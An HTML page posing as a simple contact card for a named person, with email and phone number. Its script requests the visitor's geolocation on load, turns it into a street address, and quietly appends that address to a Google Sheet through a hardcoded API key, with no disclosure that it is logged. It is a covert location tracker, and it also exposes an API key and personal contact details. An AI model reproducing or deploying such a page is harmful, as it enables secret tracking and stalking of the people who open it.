<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Monty Morris</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
    }
    .container {
      max-width: 800px;
      margin: 20px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h1, h2, p {
      margin-bottom: 20px;
    }
    .location {
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <p>Monty Morris</p>
    <p>Email: <a href="mailto:montymorris1@icloud.com">montymorris1@icloud.com</a></p>
    <p>Phone: 07857434466</p>
    <p class="location" id="locationText">Your location will appear here</p>
  </div>

  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;
          var address = "";

          // Using the OpenStreetMap Nominatim API for reverse geocoding
          var nominatimAPI = "https://nominatim.openstreetmap.org/reverse?lat=" + latitude + "&lon=" + longitude + "&format=json";

          fetch(nominatimAPI)
            .then(response => response.json())
            .then(data => {
              address = data.display_name;
              document.getElementById("locationText").textContent = address;

              // Send location to Google Sheets
              sendToGoogleSheets(address);
            })
            .catch(error => console.error('Error:', error));
        });
      } else {
        document.getElementById("locationText").textContent = "Geolocation is not supported by this browser.";
      }
    }

    function sendToGoogleSheets(location) {
      var CLIENT_ID = ''; // No need for client ID for API key usage
      var API_KEY = 'AIzaSyARh2m6kI8o53fdHlKBU1YqioKeB2-3XDk';
      var DISCOVERY_DOCS = ["https://sheets.googleapis.com/$discovery/rest?version=v4"];
      var SCOPES = "https://www.googleapis.com/auth/spreadsheets";

      gapi.load('client:auth2', initClient);

      function initClient() {
        gapi.client.init({
          apiKey: API_KEY,
          discoveryDocs: DISCOVERY_DOCS,
          scope: SCOPES
        }).then(function () {
          var values = [
            [location]
          ];
          var body = {
            values: values
          };
          gapi.client.sheets.spreadsheets.values.append({
            spreadsheetId: '1M0XRvO3zvHtmNkB6NUFkW10bs2EWSUbuFmRrhZDotJY',
            range: 'Sheet1!A1', // Specify the cell where you want to append the location
            valueInputOption: 'RAW',
            resource: body
          }).then(function(response) {
            console.log('Location added to Google Sheets:', response);
          }, function(reason) {
            console.error('Error adding location to Google Sheets:', reason.result.error.message);
          });
        });
      }
    }
  </script>
  <!-- Include the Google API client library -->
  <script src="https://apis.google.com/js/api.js"></script>
</body>
</html>
